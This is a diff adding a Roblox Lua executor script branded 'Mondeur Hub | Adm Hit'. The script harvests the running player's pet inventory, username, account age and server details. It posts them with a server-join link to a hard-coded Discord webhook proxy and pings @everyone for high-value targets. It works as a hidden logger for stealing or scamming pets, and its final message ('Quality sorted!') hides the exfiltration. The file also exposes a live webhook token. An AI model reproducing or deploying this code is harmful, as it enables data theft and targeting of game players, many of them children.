@@ -1,0 +1,166 @@
+--// MONDEUR HUB | ADM HIT 🦊 (QUALITY FIRST - PERFECT NAMES)
+
+local HttpService = game:GetService("HttpService")
+local ClientData = require(game:GetService("ReplicatedStorage"):WaitForChild("ClientModules"):WaitForChild("Core"):WaitForChild("ClientData"))
+
+local WEBHOOK = "https://webhook.lewisakura.moe/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
+local request = (syn and syn.request) or (http and http.request) or http_request or request
+
+if not request then return end
+
+local rarityPriority = {legendary=1000, ultra_rare=500, rare=100, uncommon=50, common=1}
+local rarityColors = {legendary=0xFFD700, ultra_rare=0xA020F0, rare=0x1E90FF, uncommon=0x32CD32, common=0xB0B0B0}
+
+-- =========================
+-- PERFECT QUALITY SORTING (RARITY x1000 + COUNT)
+-- =========================
+local function getQualityScore(pet)
+    local rarityScore = rarityPriority[pet.rarity] or 1
+    return rarityScore + (pet.count or 0)
+end
+
+-- =========================
+-- ULTIMATE NAME CLEANER
+-- =========================
+local function perfectName(id)
+    if not id then return nil end
+    
+    local raw = tostring(id):lower():gsub("_", " ")
+    
+    -- INSTANT BLOCK UNTRADEABLE
+    if raw:find("egg") or raw:find("jerboa") or raw:find("starter") or raw:find("practice") then 
+        return nil 
+    end
+    
+    -- REMOVE PREFIX JUNK BUT KEEP IMPORTANT PARTS
+    raw = raw:gsub("basic%s+", "")
+    raw = raw:gsub("common%s+", "")
+    
+    -- SPECIFIC PERFECT FIXES
+    raw = raw:gsub("kelpie", "Australian Kelpie")
+    raw = raw:gsub("^shiba", "Shiba Inu")
+    raw = raw:gsub("spider crab", "Spider Crab")
+    raw = raw:gsub("leopard cat", "Leopard Cat")
+    raw = raw:gsub("metal ox", "Metal Ox")
+    raw = raw:gsub("ghost wolf", "Ghost Wolf")
+    
+    -- FINAL CLEAN
+    raw = raw:gsub("%d", ""):gsub("%s+", " "):gsub("^%s*(.-)%s*$", "%1")
+    
+    return raw:sub(1,1):upper() .. raw:sub(2)
+end
+
+-- =========================
+-- EMOJIS
+-- =========================
+local function emoji(name, pet)
+    local n = name:lower()
+    local e = n:find("ox") and "🐂" or 
+              n:find("fox") and "🦊" or 
+              n:find("bee") and "🐝" or 
+              n:find("dog") and "🐕" or 
+              n:find("cat") and "🐱" or 
+              n:find("crab") and "🦀" or "🐾"
+    
+    if pet.mega then e = e .. "🌈" end
+    if pet.neon then e = e .. "🟣" end
+    if pet.ride then e = e .. "🏇" end
+    if pet.fly then e = e .. "🪽" end
+    
+    return e
+end
+
+-- =========================
+-- MAIN PROCESSOR
+-- =========================
+local function processAll(petsRaw)
+    local uniquePets = {}
+    local totalValue = 0
+    
+    for _, pet in pairs(petsRaw or {}) do
+        if pet and pet.id then
+            local name = perfectName(pet.id)
+            if name then
+                if not uniquePets[name] then
+                    uniquePets[name] = {
+                        name = name,
+                        count = 0,
+                        rarity = (pet.rarity or "common"):lower(),
+                        neon = pet.neon or pet.properties.neon,
+                        mega = pet.mega or pet.properties.mega,
+                        ride = pet.rideable or pet.properties.rideable,
+                        fly = pet.flyable or pet.properties.flyable
+                    }
+                end
+                uniquePets[name].count += 1
+                totalValue += 10
+            end
+        end
+    end
+    
+    local sorted = {}
+    for _, petData in pairs(uniquePets) do
+        table.insert(sorted, petData)
+    end
+    
+    -- QUALITY OVER QUANTITY (RARITY x1000!)
+    table.sort(sorted, function(a, b)
+        return getQualityScore(a) > getQualityScore(b)
+    end)
+    
+    return sorted, totalValue
+end
+
+-- =========================
+-- FORMAT
+-- =========================
+local function formatPets(pets)
+    local result = {}
+    for i = 1, math.min(12, #pets) do
+        result[i] = emoji(pets[i].name, pets[i]) .. " " .. pets[i].name .. " x" .. pets[i].count
+    end
+    return table.concat(result, "\n")
+end
+
+-- =========================
+-- WEBHOOK
+-- =========================
+pcall(function()
+    local inventory = ClientData.get("inventory")
+    local petsRaw = inventory.pets or {}
+    
+    local pets, total = processAll(petsRaw)
+    
+    local bestPet = pets[1] or {}
+    local bestText = bestPet.name and (bestPet.name .. " x" .. bestPet.count) or "None"
+    local bestColorRarity = bestPet.rarity or "common"
+    
+    local tier = total >= 1500 and "🔴 HIGH" or total >= 300 and "🟡 MID" or "🟢 LOW"
+    
+    local embed = {
+        title = "🦊 Mondeur Hub | Adm Hit",
+        description = "```" ..
+            "👤 "..game.Players.LocalPlayer.DisplayName.."\n"..
+            "🆔 "..game.Players.LocalPlayer.Name.."\n"..
+            "📅 "..tostring(game.Players.LocalPlayer.AccountAge).." days\n"..
+            "📱 "..(identifyexecutor and identifyexecutor() or "Unknown").."\n"..
+            "👥 "..#game.Players:GetPlayers().."/"..game.Players.MaxPlayers.."\n"..
+            "💰 "..total.."\n"..
+            "📊 "..tier.."```",
+        fields = {
+            {name="🏆 BEST PET (QUALITY)", value="```"..bestText.."```"},
+            {name="🐶 All Pets", value="```"..formatPets(pets).."```"},
+            {name="🌐 Join", value="[Click](https://www.roblox.com/games/start?placeId="..game.PlaceId.."&instanceId="..game.JobId..")"}
+        },
+        color = rarityColors[bestColorRarity] or 0x2F3136,
+        footer = {text="Mondeuronbotton"}
+    }
+    
+    request({
+        Url = WEBHOOK, Method="POST",
+        Headers={["Content-Type"]="application/json"},
+        Body=HttpService:JSONEncode({content=(tier=="🔴 HIGH" and "@everyone" or ""), embeds={embed}})
+    })
+end)
+
+print("✅ COMPLETE - Quality sorted!")
